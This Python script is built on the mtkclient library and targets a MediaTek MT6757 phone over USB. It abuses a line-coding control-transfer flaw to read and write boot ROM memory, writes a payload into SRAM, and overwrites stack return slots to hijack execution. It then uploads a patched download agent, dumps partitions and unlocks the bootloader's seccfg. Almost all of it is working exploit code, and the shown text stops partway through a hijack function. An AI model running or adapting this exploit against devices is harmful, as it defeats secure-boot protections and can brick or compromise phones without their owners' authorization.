#!/usr/bin/env python3
import os
import sys
import time
import logging
import traceback
from struct import pack, unpack

sys.path.insert(0, '/tmp/mtknew')

try:
    sys.stderr.reconfigure(line_buffering=True)
except Exception:
    pass
try:
    import faulthandler
    _faultlog = open('/tmp/agent_fault.log', 'a')
    faulthandler.enable(_faultlog)
except Exception:
    pass

import usb.core
from mtkclient.Library.Connection.usblib import UsbClass

ACK = b'\xa1\xa2\xa3\xa4'
HS = b'\xa0\x0a\x50\x05'
PAYLOAD_ADDR = 0x100A00
PTR_DA_FALLBACK = 0xA0E8
PAYLOAD_FILE = '/tmp/mtknew/mtkclient/payloads/mt6757_payload.bin'
K2_WARM = (5, 6, 7)
K2_LOW = (-2, -3, -4, -5)
K2_HIGH = (-2, -3, -4)
HIJACK_SLOTS = [0x1027C0, 0x1027B8, 0x1027B4, 0x1027C4, 0x1027B0, 0x103060]
RXLOG = bytearray()
DEVICE_GONE = False
_ERRCNT = [0]
payload_global = b''


def log(*a):
    print('[AGENT %s]' % time.strftime('%H:%M:%S'), *a, flush=True)


def hx(b):
    if b is None:
        return None
    try:
        return bytes(b).hex()
    except Exception:
        return repr(b)


def hxi(v):
    try:
        return hex(v)
    except Exception:
        return repr(v)


os.makedirs('/tmp/backup', exist_ok=True)
os.chdir('/tmp/backup')
_nullfd = os.open('/dev/null', os.O_RDONLY)
os.dup2(_nullfd, 0)

from mtkclient.config.mtk_config import MtkConfig
from mtkclient.Library.mtk_class import Mtk
from mtkclient.Library.DA.mtk_da_handler import DaHandler
from mtkclient.Library.mtk_main import ArgHandler


class Args:
    def __init__(self, **kw):
        self.__dict__.update(kw)

    def __getattr__(self, name):
        return None


def gone(e):
    if DEVICE_GONE:
        return True
    s = str(e).lower()
    if ('no such device' in s or 'disconnected' in s or 'not found' in s
            or 'i/o error' in s or 'pipe error' in s or 'entity not found' in s):
        globals()['DEVICE_GONE'] = True
        log('DEVICE_GONE', e)
        return True
    return False


def ep_read(mtk, n, timeout=250):
    cdc = mtk.port.cdc
    out = bytearray()
    if cdc.rxleft:
        take = bytes(cdc.rxleft[:n])
        del cdc.rxleft[:len(take)]
        out.extend(take)
    while len(out) < n:
        try:
            d = cdc.EP_IN.read(n - len(out), timeout=timeout)
            if not d:
                break
            out.extend(bytes(d))
        except usb.core.USBError as e:
            if gone(e):
                break
            err = str(e).lower()
            _ERRCNT[0] += 1
            if ('timed out' not in err and 'timeout' not in err
                    and _ERRCNT[0] <= 3):
                log('EP_IN_ERR', e)
            break
        except Exception as e:
            _ERRCNT[0] += 1
            if _ERRCNT[0] <= 3:
                log('EP_IN_ERR', type(e).__name__, e)
            break
    return bytes(out)


def ep_write(mtk, data, timeout=500):
    try:
        return mtk.port.cdc.EP_OUT.write(data, timeout=timeout) == len(data)
    except Exception as e:
        if gone(e):
            return False
        _ERRCNT[0] += 1
        if _ERRCNT[0] <= 3:
            log('EP_OUT_ERR', type(e).__name__, e)
        return False


def rx(mtk, n, timeout=250):
    d = ep_read(mtk, n, timeout)
    if d:
        RXLOG.extend(d)
    return d


def harvest(mtk, ms=60):
    cdc = mtk.port.cdc
    if cdc.rxleft:
        RXLOG.extend(bytes(cdc.rxleft))
        cdc.rxleft.clear()
    for _ in range(8):
        d = ep_read(mtk, 64, ms)
        if not d:
            break
        RXLOG.extend(d)


def collect(mtk, secs, chunk=64):
    end = time.time() + secs
    out = bytearray()
    while time.time() < end and not DEVICE_GONE:
        d = ep_read(mtk, chunk, 100)
        if d:
            out.extend(d)
            RXLOG.extend(d)
    return bytes(out)


def flush_ep(mtk):
    cdc = mtk.port.cdc
    try:
        cdc.rxleft.clear()
    except Exception:
        pass
    for _ in range(8):
        try:
            if not ep_read(mtk, 64, 40):
                break
        except Exception:
            break


def ack_seen():
    return RXLOG.find(ACK) != -1


class K2:
    def __init__(self, mtk, dev, pre, ptr_da, offset=8, trigger='0200'):
        self.mtk = mtk
        self.dev = dev
        self.pre = pre
        self.ptr_da = ptr_da
        self.offset = offset
        self.trigger = trigger
        self.watchdog = mtk.config.chipconfig.watchdog
        self.lc = None
        self.idx = 0
        self.tstat = {}
        self.tlast_exc = None
        self.tlast_rx = None
        self.final_override = None
        self.pda_exc = 0
        self.pr32_exc = 0

    def read_linecode(self):
        for idx in (0, 1):
            try:
                lc = bytes(self.dev.ctrl_transfer(0xA1, 0x21, 0, idx, 7, timeout=1500))
                if len(lc) >= 7:
                    self.lc = lc[:7]
                    self.idx = idx
                    log('LINECODE_OK', 'idx=%d' % idx, hx(self.lc))
                    return self.lc
            except Exception as e:
                log('LINECODE_EXC', 'idx=%d' % idx, type(e).__name__, e)
        self.lc = b'\x00\x10\x0e\x00\x00\x00\x08'
        self.idx = 1
        log('LINECODE_DEFAULT', 'idx=1')
        return self.lc

    def send(self, addr):
        if self.lc is None:
            self.read_linecode()
        base = bytearray(self.lc[:7])
        while len(base) < self.offset:
            base.append(0)
        data = bytes(base) + pack('<I', addr & 0xFFFFFFFF)
        self.dev.ctrl_transfer(0x21, 0x20, 0, self.idx, data, timeout=1500)
        self.trigger_get()

    def trigger_get(self):
        t = self.trigger
        if t == 'none':
            return
        try:
            if t == '0200':
                wv, widx = 0x0200, 0
            elif t == '02ffidx':
                wv, widx = 0x02FF, 0xFFFF
            else:
                wv, widx = 0x02FF, 0
            r = self.dev.ctrl_transfer(0x80, 0x06, wv, widx, 9, timeout=1500)
            self.tlast_rx = bytes(r)
            self.tstat[t + '_ok'] = self.tstat.get(t + '_ok', 0) + 1
        except Exception as e:
            self.tlast_rx = 'exc'
            self.tstat[t + '_exc'] = self.tstat.get(t + '_exc', 0) + 1
            self.tlast_exc = '%s:%s' % (type(e).__name__, e)

    def access(self, address, length, data=None, check=True, mode=-1, final=None):
        if final is None:
            final = self.final_override
        flush_ep(self.mtk)
        try:
            self.pre.brom_register_access(0, 1)
        except Exception as e:
            self.pda_exc += 1
            if self.pda_exc <= 5:
                log('PREL_DA_EXC', type(e).__name__, str(e)[:60])
        try:
            self.pre.read32(self.watchdog + 0x50)
        except Exception as e:
            self.pr32_exc += 1
            if self.pr32_exc <= 5:
                log('PREL_R32_EXC', type(e).__name__, str(e)[:60])
        for off in K2_WARM:
            self.send(self.ptr_da + off)
        if final is not None:
            self.send(final)
            sent = address - 0x40
        elif address < 0x40:
            for off in K2_LOW:
                self.send(self.ptr_da + off)
            sent = address
        else:
            for off in K2_HIGH:
                self.send(self.ptr_da + off)
            sent = address - 0x40
        return self.pre.brom_register_access(sent, length, data, check, mode)


def acc(k2, addr, length, data=None, check=True, tag='', final=None):
    try:
        d = k2.access(addr, length, data, check, final=final)
    except Exception as e:
        log('ACC_EXC', tag, hex(addr), type(e).__name__, str(e))
        return None, 'exc'
    if d is None:
        log('ACC_NONE', tag, hex(addr))
        return None, 'none'
    return bytes(d), 'ok'


def rd(k2, addr, n, tag):
    v, st = acc(k2, addr, n, tag=tag)
    log('READ', tag, hex(addr), st, hx(v))
    return v


def payload_words(payload):
    return [unpack('<I', payload[i:i + 4])[0] for i in range(0, len(payload), 4)]


def wait_ack(mtk, seconds, provoke=False, provoke_fn=None):
    end = time.time() + seconds
    harvest(mtk)
    if ack_seen():
        return True
    next_provoke = time.time() + 0.3
    while time.time() < end and not DEVICE_GONE:
        d = rx(mtk, 4, 150)
        if d:
            log('TRIG_RX', d.hex())
        if ack_seen():
            return True
        if provoke and time.time() >= next_provoke:
            try:
                if provoke_fn is not None:
                    provoke_fn()
                else:
                    mtk.preloader.brom_register_access(0, 1)
            except Exception as e:
                log('PROVOKE_EXC', type(e).__name__, e)
            next_provoke = time.time() + 0.3
            if ack_seen():
                return True
    harvest(mtk)
    return ack_seen()


def raw_handshake(mtk):
    expect = bytes((~b) & 0xFF for b in HS)
    for attempt in range(6):
        got = bytearray()
        ok = True
        for b in HS:
            if not ep_write(mtk, bytes([b])):
                ok = False
                break
            e = ep_read(mtk, 1, 300)
            if len(e) == 1:
                got.extend(e)
            else:
                ok = False
                break
        log('HS_ATTEMPT', attempt, 'rx=' + bytes(got).hex())
        if ok and bytes(got) == expect:
            RXLOG.extend(got)
            return True
        harvest(mtk)
        time.sleep(0.05)
    return False


def do_handshake(mtk):
    try:
        mtk.port.cdc.set_line_coding(921600, 0, 8, 1)
        mtk.port.cdc.setcontrollinestate(rts=True)
    except Exception as e:
        log('HS_PORT_EXC', type(e).__name__, e)
    try:
        if mtk.port.run_handshake():
            log('HS_PORT_OK')
            return True
    except Exception as e:
        log('HS_PORT_EXC2', type(e).__name__, e)
    return raw_handshake(mtk)


def alive(k2, tag):
    v, st = acc(k2, 0x9C2C, 4, tag='live-' + tag)
    ok = st == 'ok'
    log('ALIVE', tag, ok)
    return ok


def hijack_write(mtk, k2, slot, model, secs=1.4):
    logical = slot if model == 'A' else slot + 0x40
    flush_ep(mtk)
    RXLOG.clear()
    try:
        k2.access(logical, 4, pack('<I', PAYLOAD_ADDR), check=False)
    except Exception as e:
        log('HIJ_EXC', model, hex(slot), type(e).__name__, e)
        return None
    resp = collect(mtk, secs)
    log('HIJ_RESP', model, hex(slot), 'sent=%s' % hex(logical - 0x40), hx(resp))
    return resp


def jump_collect(mtk, k2, addr, secs=1.5):
    flush_ep(mtk)
    RXLOG.clear()
    try:
        ok = k2.pre.jump_da(addr)
    except Exception as e:
        log('JUMP_EXC', hex(addr), type(e).__name__, e)
        ok = None
    log('JUMP_STATUS', hex(addr), ok)
    resp = collect(mtk, secs)
    log('JUMP_RESP', hex(addr), hx(resp))
    return resp


def write_payload_verified(k2, base):
    words = payload_words(payload_global)
    bad = []
    for i, w in enumerate(words):
        tgt = base + i * 4
        want = pack('<I', w)
        ok = False
        for _ in range(3):
            _, st = acc(k2, tgt, 4, want, tag='pw')
            if st != 'ok':
                continue
            v, vst = acc(k2, tgt, 4, tag='pr')
            if vst == 'ok' and v == want:
                ok = True
                break
        if not ok:
            bad.append(i)
        if (i + 1) % 32 == 0:
            log('PAYWRITE_PROGRESS', i + 1, 'bad=%d' % len(bad))
        if DEVICE_GONE:
            break
    log('PAYWRITE_DONE', len(words) - len(bad), 'bad=%s' % bad[:16])
    for i in list(bad):
        tgt = base + i * 4
        want = pack('<I', words[i])
        acc(k2, tgt, 4, want, tag='pwr')
    v, vst = acc(k2, base, len(payload_global), tag='pverify')
    match = vst == 'ok' and v == payload_global
    log('PAYVERIFY', vst, 'match=%s' % match, (hx(v) or 'None')[:96])
    return match



def provoke_cmd(mtk, cmd, secs=1.2):
    try:
        ok = mtk.port.echo(cmd)
    except Exception as e:
        log('PROVOKE_EXC', hex(cmd), type(e).__name__, e)
        ok = None
    resp = collect(mtk, secs)
    log('PROVOKE', hex(cmd), ok, hx(resp))
    return resp


def diag_reads(k2):
    vals = {}
    for addr in (0x0, 0x40, 0x9C2C, 0x9C6C, 0x1027B8, 0x1027F8,
                 0x1030B4, 0x100A00):
        v, st = acc(k2, addr, 4, tag='diag')
        val = None
        if v is not None and len(v) == 4:
            val = unpack('<I', v)[0]
        vals[addr] = val
        log('DIAG', hex(addr), st, hxi(val))
    return vals


def hijack_phase(mtk, k2, da, sp, model, written):
    base = PAYLOAD_ADDR if model == 'A' else PAYLOAD_ADDR + 0x40
    if base not in written:
        log('PHASE', 'payload-%s' % model, hex(base))
        ok = write_payload_verified(k2, base)
        log('PAYWRITE_RESULT_%s' % model, ok)
        written.add(base)
        if not alive(k2, 'after-write-%s' % model):
            log('DEVICE_DEAD_AFTER_WRITE')
            return 'dead'
    slot = sp + 8
    logical = slot if model == 'A' else slot + 0x40
    log('PHASE', 'hijack-%s' % model, 'sp=%s' % hex(sp), 'slot=%s' % hex(slot))
    flush_ep(mtk)
    RXLOG.clear()
    try:
        k2.access(logical, 4, pack('<I', PAYLOAD_ADDR), check=False)
    except Exception as e:
        log('HIJ_EXC', model, hex(slot), type(e).__name__, e)
        return 'exc'
    resp = collect(mtk, 0.8)
    log('HIJ_RESP', model, hex(slot), hx(resp))
    if ACK in (resp or b'') or ack_seen():
        log('HIJACK_ACK', model, hex(slot), 'on-write')
        return 'ack'
    for cmd in (0xFD, 0xFC):
        r = provoke_cmd(mtk, cmd)
        if ACK in (r or b'') or ack_seen():
            log('HIJACK_ACK', model, hex(slot), 'provoke=%02x' % cmd)
            return 'ack'
    try:
        rv = k2.access(0x0, 0x40, None, True)
        log('PROVOKE_R40', hx(rv))
        if rv and ACK in rv:
            log('HIJACK_ACK', model, hex(slot), 'provoke=read40')
            return 'ack'
    except Exception as e:
        log('PROVOKE_R40_EXC', type(e).__name__, e)
    r = collect(mtk, 0.5)
    if ACK in (r or b'') or ack_seen():
        log('HIJACK_ACK', model, hex(slot), 'provoke=read40-late')
        return 'ack'
    return 'none'


def da_flow(mtk, da, label):
    log('DA_FLOW_START', label)
    mtk.daloader.patch = True
    try:
        res = mtk.daloader.upload_da(preloader=None)
    except Exception as e:
        log('DA_UPLOAD_EXC', type(e).__name__, e)
        traceback.print_exc()
        res = False
    log('DA_UPLOAD', res)
    if not res:
        log('DA_UPLOAD_FAILED')
        os._exit(4)
    try:
        mtk.daloader.writestate()
    except Exception:
        pass
    log('DA_READY')

    targets = [
        ('gpt', '/tmp/backup/gpt.bin'),
        ('preloader', '/tmp/backup/preloader.bin'),
        ('proinfo', '/tmp/backup/proinfo.bin'),
        ('nvram', '/tmp/backup/nvram.bin'),
        ('protect1', '/tmp/backup/protect1.bin'),
        ('protect2', '/tmp/backup/protect2.bin'),
        ('lk', '/tmp/backup/lk.bin'),
        ('boot', '/tmp/backup/boot.img'),
        ('recovery', '/tmp/backup/recovery.img'),
        ('seccfg', '/tmp/backup/seccfg_before.bin'),
    ]
    for name, path in targets:
        try:
            da.da_read(name, 'user', path)
            size = os.path.getsize(path) if os.path.exists(path) else 'missing'
            log('BACKUP_OK', name, size)
        except Exception as e:
            log('BACKUP_FAIL', name, type(e).__name__, e)

    gptp = '/tmp/backup/gpt.bin'
    secp = '/tmp/backup/seccfg_before.bin'
    backup_ok = (os.path.exists(gptp) and os.path.getsize(gptp) > 0
                 and os.path.exists(secp) and os.path.getsize(secp) > 0)
    if not backup_ok:
        log('SECCFG_SKIPPED_BACKUP_MISSING', os.path.exists(gptp), os.path.exists(secp))
        log('DA_KEPT_ALIVE_FOR_ATTACH')
        os._exit(5)
    else:
        try:
            res = mtk.daloader.seccfg('unlock')
            log('SECCFG_RESULT', repr(res))
        except Exception as e:
            log('SECCFG_FAIL', type(e).__name__, e)
            traceback.print_exc()

        try:
            da.da_read('seccfg', 'user', '/tmp/backup/seccfg_after.bin')
            log('SECCFG_AFTER_OK', os.path.getsize('/tmp/backup/seccfg_after.bin'))
        except Exception as e:
            log('SECCFG_AFTER_FAIL', type(e).__name__, e)

    try:
        mtk.daloader.shutdown(bootmode=0)
        log('RESET_SENT')
    except Exception as e:
        log('RESET_FAIL', type(e).__name__, e)

    log('AGENT_DONE')
    os._exit(0)


def try_handshake_and_da(mtk, da, label):
    time.sleep(0.12)
    flush_ep(mtk)
    RXLOG.clear()
    if raw_handshake(mtk):
        log('HANDSHAKE_OK', label)
        da_flow(mtk, da, label)
        return True
    if do_handshake(mtk):
        log('HANDSHAKE_OK_PORT', label)
        da_flow(mtk, da, label)
        return True
    log('HANDSHAKE_FAIL', label)
    return False


def u32(b):
    if b is not None and len(b) == 4:
        return unpack('<I', b)[0]
    return None


def probe32(k2, addr):
    v, st = acc(k2, addr, 4, tag='probe')
    return u32(v), st


def write_payload_bulk(k2, base):
    log('PAYWRITE_BULK_START', hex(base), len(payload_global))
    _, st = acc(k2, base, len(payload_global), payload_global, tag='pwbulk')
    log('PAYWRITE_BULK_ST', st)
    if st != 'ok':
        return False
    v, vst = acc(k2, base, len(payload_global), tag='prbulk')
    match = vst == 'ok' and v == payload_global
    log('PAYVERIFY_BULK', vst, 'match=%s' % match, (hx(v) or 'None')[:96])
    return match


def wdt_probe(k2, tag, addr):
    log('WDT_PROBE', tag, hex(addr))
    try:
        _, st = acc(k2, addr, 4, pack('<I', 0x1971), tag='wdt-' + tag)
        log('WDT_WRITE_ST', tag, st)
    except Exception as e:
        log('WDT_EXC', tag, type(e).__name__, e)
    end = time.time() + 2.4
    while time.time() < end:
        if DEVICE_GONE:
            log('WDT_RESET', tag)
            return True
        try:
            probe32(k2, 0x0)
        except Exception:
            log('WDT_RESET', tag, 'probe-exc')
            return True
        if DEVICE_GONE:
            log('WDT_RESET', tag)
            return True
        time.sleep(0.3)
    log('WDT_NO_RESET', tag)
    return False




def swap32(v):
    return unpack('<I', pack('>I', v))[0]


import threading

_hb = [time.time()]
_orig_log = log


def log(*a):
    _hb[0] = time.time()
    _orig_log(*a)


def start_stall_watchdog(limit=45):
    def run():
        while True:
            time.sleep(5)
            if time.time() - _hb[0] > limit:
                try:
                    print('[AGENT %s] STALL no progress for %ds, exiting'
                          % (time.strftime('%H:%M:%S'), limit), flush=True)
                finally:
                    os._exit(12)
    threading.Thread(target=run, daemon=True).start()


def reset_probe(k2, wdt):
    # MTK WDT: RESTART 0x1971 @ +0x08, MODE 0x22000014 @ +0x00, SWRST 0x1209 @ +0x14
    seq = [(wdt + 0x08, 0x1971), (wdt + 0x00, 0x22000014), (wdt + 0x14, 0x1209)]
    for addr, val in seq:
        try:
            _, st = acc(k2, addr, 4, pack('<I', val), tag='rst-%s' % hxi(addr))
            log('RESET_WRITE', hxi(addr), hxi(val), st)
        except Exception as e:
            log('RESET_EXC', hxi(addr), type(e).__name__, e)
        if DEVICE_GONE:
            log('RESET_DEVICE_GONE')
            return True
    end = time.time() + 3.0
    while time.time() < end:
        if DEVICE_GONE:
            log('RESET_OK')
            return True
        try:
            _, st = acc(k2, 0x0, 4, tag='rst-live')
        except Exception as e:
            log('RESET_PROBE_GONE', type(e).__name__)
            return True
        if st != 'ok' or DEVICE_GONE:
            log('RESET_PROBE_DEAD', st)
            return True
        time.sleep(0.4)
    log('RESET_NO_EFFECT')
    return False


def prep_linecode(dev):
    try:
        n = dev.ctrl_transfer(0x21, 0x20, 0, 0, bytes.fromhex('00c20100000008'),
                              timeout=1200)
        log('LC_SET_INIT', 'sent=%s' % n)
    except Exception as e:
        log('LC_SET_INIT_EXC', type(e).__name__, str(e)[:60])


def linecode_diag(dev, k2):
    for idx in (0, 1):
        try:
            r = bytes(dev.ctrl_transfer(0xA1, 0x25, 0, idx, 8, timeout=1200))
            log('LC25_OK', 'idx=%d' % idx, hx(r))
        except Exception as e:
            log('LC25_EXC', 'idx=%d' % idx, type(e).__name__, str(e)[:60])
    pat = bytes.fromhex('11223344556677')
    try:
        n = dev.ctrl_transfer(0x21, 0x20, 0, k2.idx, pat, timeout=1200)
        k2.trigger_get()
        rb = bytes(dev.ctrl_transfer(0xA1, 0x21, 0, k2.idx, 7, timeout=1200))
        log('LC_RB_PAT', 'sent=%s' % n, hx(rb), 'match=%s' % (rb == pat))
    except Exception as e:
        log('LC_RB_EXC', type(e).__name__, str(e)[:60])
    data12 = k2.lc[:7] + b'\x00' + pack('<I', 0xA0E4)
    try:
        n = dev.ctrl_transfer(0x21, 0x20, 0, k2.idx, data12, timeout=1200)
        k2.trigger_get()
        rb = bytes(dev.ctrl_transfer(0xA1, 0x21, 0, k2.idx, 7, timeout=1200))
        log('LC_RB_12', 'sent=%s' % n, hx(rb))
    except Exception as e:
        log('LC12_EXC', type(e).__name__, str(e)[:60])
    try:
        dev.ctrl_transfer(0x21, 0x20, 0, k2.idx, k2.lc[:7], timeout=1200)
        log('LC_RESTORE_OK')
    except Exception as e:
        log('LC_RESTORE_EXC', type(e).__name__, str(e)[:60])


def matrix_probe(mtk, dev, pre, ptr_da, lc):
    combos = [(8, '0200', 0), (8, '02ff', 0), (9, '0200', 0), (9, '02ff', 0),
              (7, '0200', 0), (10, '0200', 0), (8, '0200', 1)]
    for off, trig, widx in combos:
        if DEVICE_GONE:
            return None
        k2 = K2(mtk, dev, pre, ptr_da, offset=off, trigger=trig)
        k2.lc = lc
        k2.idx = widx
        got = {}
        for addr, name in ((0x9C2C, 'sp'), (0x0, 'vec'), (0x100A00, 'sram')):
            v, st = acc(k2, addr, 4, tag='mtx-' + name)
            got[name] = (v, st)
            log('MTX', 'off=%d' % off, 'trig=%s' % trig, 'idx=%d' % widx, name, st, hx(v))
        log('MTX_TRIG', 'off=%d' % off, 'trig=%s' % trig, 'idx=%d' % widx,
            repr(k2.tstat), 'rx=%s' % hx(k2.tlast_rx), str(k2.tlast_exc))
        sp = u32(got['sp'][0])
        if sp is not None and 0x00100000 <= sp < 0x00180000:
            log('MTX_SANE_SP', 'off=%d' % off, 'trig=%s' % trig, 'idx=%d' % widx, hxi(sp))
            return k2, sp
    return None


def combo_canary(mtk, dev, pre, ptr_da, lc, da, off, trig, widx):
    k2 = K2(mtk, dev, pre, ptr_da, offset=off, trigger=trig)
    k2.lc = lc
    k2.idx = widx
    log('COMBO_START', 'off=%d' % off, 'trig=%s' % trig, 'idx=%d' % widx)
    v, st = acc(k2, 0x100A00, 4, tag='cprobe')
    log('COMBO_PROBE', st, hx(v))
    log('COMBO_TRIG', repr(k2.tstat), str(k2.tlast_exc))
    _, wst = acc(k2, 0x100E00, 4, pack('<I', 0xDEADBEEF), tag='canA-w')
    cv, cst = acc(k2, 0x100E00, 4, tag='canA-r')
    log('CAN_A', 'write=%s' % wst, 'read=%s' % cst, hx(cv))
    _, wst2 = acc(k2, 0x100F00, 4, pack('<I', 0xCAFEBABE), tag='canB-w')
    cv2, cst2 = acc(k2, 0x100F00, 4, tag='canB-r')
    log('CAN_B', 'write=%s' % wst2, 'read=%s' % cst2, hx(cv2))
    ok = (cst == 'ok' and u32(cv) == 0xDEADBEEF
          and cst2 == 'ok' and u32(cv2) == 0xCAFEBABE)
    log('CANARY_DOUBLE', 'off=%d' % off, 'trig=%s' % trig, 'ok=%s' % ok)
    if ok:
        return k2
    return None


def scan_final(mtk, dev, pre, ptr_da, lc, da):
    center = ptr_da - 4
    k2 = K2(mtk, dev, pre, ptr_da, offset=8, trigger='0200')
    k2.lc = lc
    k2.idx = 0
    order = []
    for d in range(0, 0x700):
        order.append(center + d)
        order.append(center - d)
    log('SCAN_START', 'center=%s' % hxi(center), 'n=%d' % len(order))
    for i, F in enumerate(order):
        if DEVICE_GONE or i >= 1400:
            break
        try:
            v, st = acc(k2, 0x9C2C, 4, tag='scan', final=F)
        except Exception as e:
            log('SCAN_EXC', i, hxi(F), type(e).__name__, str(e)[:40])
            if gone(e):
                break
            continue
        val = u32(v)
        if st == 'ok' and val is not None and 0x00100000 <= val < 0x00180000:
            log('SCAN_HIT', i, hxi(F), hxi(val))
            return F
        if i % 32 == 0:
            log('SCAN_PROGRESS', i, 'F=%s' % hxi(F), st, hx(v))
    return None


CONV_TARGETS = (0x1027B8, 0x1027C0, 0x9C2C)
CONV_DELTAS = (-0x40, 0, 0x40)


def conv_probe(k2):
    findings = {}
    for T in CONV_TARGETS:
        for d in CONV_DELTAS:
            cmd = T - d
            v, st = acc(k2, cmd, 4, tag='conv')
            val = u32(v)
            sane = (st == 'ok' and val is not None and val not in (0, 0xFFFFFFFF)
                    and ((0x00100000 <= val < 0x00180000) or (0 <= val < 0x20000)))
            findings[(T, d)] = (st, val, sane)
            log('CONV', 'T=%s' % hxi(T), 'd=%+d' % d, 'cmd=%s' % hxi(cmd), st, hxi(val), 'sane=%s' % sane)
    best = None
    for d in CONV_DELTAS:
        n = sum(1 for (T, dd) in findings if dd == d and findings[(T, dd)][2])
        log('CONV_VOTE', 'd=%+d' % d, 'sane=%d' % n)
        if n and (best is None or n > best[1]):
            best = (d, n)
    if best:
        log('CONV_BEST', 'delta=%+d' % best[0], 'sane=%d' % best[1])
        return best[0]
    log('CONV_UNKNOWN')
    return None


def hijack_attempt(mtk, k2, slot_cmd, value, tag):
    flush_ep(mtk)
    RXLOG.clear()
    try:
        k2.access(slot_cmd, 4, pack('<I', value & 0xFFFFFFFF), check=False)
    except Exception as e:
        log('HIJ_EXC', tag, hxi(slot_cmd), type(e).__name__, str(e)[:50])
        return False
    resp = collect(mtk, 0.8)
    log('HIJ_RESP', tag, 'cmd=%s' % hxi(slot_cmd), 'val=%s' % hxi(value), hx(resp))
    if ACK in (resp or b'') or ack_seen():
        log('HIJACK_ACK', tag, 'on-write')
        return True
    for cmd in (0xFD, 0xFC):
        r = provoke_cmd(mtk, cmd)
        if ACK in (r or b'') or ack_seen():
            log('HIJACK_ACK', tag, 'provoke=%02x' % cmd)
            return True
    try:
        rv = k2.access(0x0, 0x40, None, True)
        log('PROVOKE_R40', hx(rv))
        if rv and ACK in rv:
            log('HIJACK_ACK', tag, 'provoke=read40')
            return True
    except Exception as e:
        log('PROVOKE_R40_EXC', type(e).__name__, e)
    r = collect(mtk, 0.5)
    if ACK in (r or b'') or ack_seen():
        log('HIJACK_ACK', tag, 'provoke=read40-late')
        return True
    return False


def wdt_classify(k2, wdt, deltas):
    for d in deltas:
        log('WDT_CLASS_TRY', 'delta=%+d' % d)
        seq = [(wdt + 0x08 - d, 0x1971), (wdt + 0x00 - d, 0x22000014),
               (wdt + 0x14 - d, 0x1209)]
        for addr, val in seq:
            try:
                _, st = acc(k2, addr, 4, pack('<I', val), tag='wdtc')
                log('WDT_WR', hxi(addr), hxi(val), st)
            except Exception as e:
                log('WDT_EXC', type(e).__name__, str(e)[:60])
            if DEVICE_GONE:
                log('WDT_REAL', 'delta=%+d' % d, 'after=%s' % hxi(addr))
                return True
        end = time.time() + 2.4
        while time.time() < end:
            if DEVICE_GONE:
                log('WDT_REAL', 'delta=%+d' % d)
                return True
            try:
                _, st = acc(k2, 0x0, 4, tag='wdt-live')
            except Exception:
                log('WDT_REAL', 'delta=%+d' % d, 'probe-exc')
                return True
            if DEVICE_GONE:
                log('WDT_REAL', 'delta=%+d' % d)
                return True
            time.sleep(0.3)
        log('WDT_NO_RESET', 'delta=%+d' % d)
    return False


def xcanary(k2):
    acc(k2, 0x100E00, 4, pack('<I', 0x11111111), tag='xc-w1')
    acc(k2, 0x100F00, 4, pack('<I', 0x22222222), tag='xc-w2')
    v1, st1 = acc(k2, 0x100E00, 4, tag='xc-r1')
    v2, st2 = acc(k2, 0x100F00, 4, tag='xc-r2')
    acc(k2, 0x100E40, 4, pack('<I', 0x33333333), tag='xc-w3')
    v3, st3 = acc(k2, 0x100E00, 4, tag='xc-r3')
    v4, st4 = acc(k2, 0x100F00, 4, tag='xc-r4')
    v5, st5 = acc(k2, 0x100E40, 4, tag='xc-r5')
    log('XCANARY', 'r1=%s' % hx(v1), 'r2=%s' % hx(v2), 'r3=%s' % hx(v3),
        'r4=%s' % hx(v4), 'r5=%s' % hx(v5))
    return {'r1': u32(v1), 'r2': u32(v2), 'r3': u32(v3),
            'r4': u32(v4), 'r5': u32(v5)}


def vec_reads(k2):
    for addr in (0x0, 0x4, 0x8, 0x40):
        v, st = acc(k2, addr, 4, tag='vec')
        log('VEC', hex(addr), st, hx(v), hxi(u32(v)))


def m2read(k2, addr, tag):
    try:
        d = k2.access(addr, 4, None, True, 2)
    except Exception as e:
        log('M2_EXC', tag, hxi(addr), type(e).__name__, str(e)[:60])
        return None
    log('M2', tag, hxi(addr), hx(d), hxi(u32(d)))
    return d


def m3write(k2, addr, val, tag):
    try:
        k2.access(addr, 4, pack('<I', val & 0xFFFFFFFF), True, 3)
        log('M3W', tag, hxi(addr), hxi(val))
        return True
    except Exception as e:
        log('M3W_EXC', tag, hxi(addr), type(e).__name__, str(e)[:60])
        return False


def m2scan(k2, start, end, step, tag, want=None):
    hits = []
    n = 0
    for cmd in range(start, end, step):
        if DEVICE_GONE:
            break
        try:
            d = k2.access(cmd, 4, None, True, 2)
            n += 1
            v = u32(d)
            if want is not None:
                ok = (v == want)
            else:
                ok = (v is not None and 0x00100000 <= v < 0x00180000)
            if ok:
                log('M2SCAN_HIT', tag, hxi(cmd), hxi(v))
                hits.append((cmd, v))
        except Exception as e:
            log('M2SCAN_EXC', tag, hxi(cmd), type(e).__name__, str(e)[:50])
    log('M2SCAN_DONE', tag, 'scanned=%d' % n, 'hits=%d' % len(hits))
    return hits


def m3_payload(k2, base):
    words = payload_words(payload_global)
    bad = []
    for i, w in enumerate(words):
        tgt = base + i * 4
        if not m3write(k2, tgt, w, 'p%03d' % i):
            bad.append(i)
        if (i + 1) % 32 == 0:
            log('M3P_PROGRESS', i + 1, 'bad=%d' % len(bad))
        if DEVICE_GONE:
            break
    log('M3P_DONE', 'wrote=%d' % (len(words) - len(bad)), 'bad=%s' % bad[:16])
    try:
        d = k2.access(base, len(payload_global), None, True, 2)
    except Exception as e:
        log('M3V_EXC', type(e).__name__, str(e)[:60])
        d = None
    match = d == payload_global
    log('M3_VERIFY', 'match=%s' % match, (hx(d) or 'None')[:96])
    return match


def hijack_m3(mtk, k2, slot_cmd, value, tag):
    flush_ep(mtk)
    RXLOG.clear()
    try:
        k2.access(slot_cmd, 4, pack('<I', value & 0xFFFFFFFF), check=False, mode=3)
    except Exception as e:
        log('HJM3_EXC', tag, hxi(slot_cmd), type(e).__name__, str(e)[:60])
        return False
    resp = collect(mtk, 0.5)
    if ACK in (resp or b'') or ack_seen():
        log('HJM3_ACK', tag, 'on-write')
        return True
    for cmd in (0xFD, 0xFC):
        r = provoke_cmd(mtk, cmd)
        if ACK in (r or b'') or ack_seen():
            log('HJM3_ACK', tag, 'provoke=%02x' % cmd)
            return True
        r2 = collect(mtk, 0.3)
        if ACK in (r2 or b'') or ack_seen():
            log('HJM3_ACK', tag, 'provoke=%02x-late' % cmd)
            return True
    try:
        rv = k2.access(0x0, 0x40, None, True, 2)
        log('HJM3_R40', hx(rv))
        if rv and ACK in rv:
            log('HJM3_ACK', tag, 'provoke=read40')
            return True
    except Exception as e:
        log('HJM3_R40_EXC', type(e).__name__, e)
